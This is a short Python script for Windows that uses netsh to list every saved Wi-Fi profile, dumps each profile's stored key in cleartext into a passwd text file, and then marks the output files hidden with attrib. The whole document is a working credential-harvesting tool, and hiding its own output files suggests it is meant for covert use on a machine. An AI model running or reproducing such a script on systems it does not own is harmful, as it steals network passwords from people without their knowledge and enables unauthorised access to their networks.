import os

def getSSID(a):
    file = open('random{}.txt'.format(a),'r')
    linhas = file.readlines()
    file.close()
    ssid = []
    for linha in linhas:
        linha = linha.strip()
        if linha.find(': ') != -1:
            SSID = (linha.strip('All User Profile     :'))
            ssid.append(SSID)
            pass
        pass
    return ssid
    pass

def mkText():
    a = 0
    while True:
        file = 'random{}.txt'.format(a)
        if os.path.isfile(file):
            a = a + 1
        else:
            os.system('netsh wlan show profiles > random{}.txt'.format(a))
            return a
    pass

def hide(a):
    nick = 'random{}.txt'.format(a)
    nick2 = 'passwd{}.txt'.format(a)
    folder = os.listdir(os.getcwd())
    for arq in folder:
        if nick == arq or nick2 == arq:
            os.system('attrib +h +i -a {}'.format(nick))
            os.system('attrib +h +i -a {}'.format(nick2))
            break
            pass
        pass
    pass

def execute():
    a = mkText()
    string = getSSID(a)
    for x in range(0, string.__len__()):
        os.system('netsh wlan show profiles "{}" key=clear >> passwd{}.txt'.format(string[x],a))
        pass
    hide(a)
    pass

if __name__ == '__main__':

    execute()

    pass
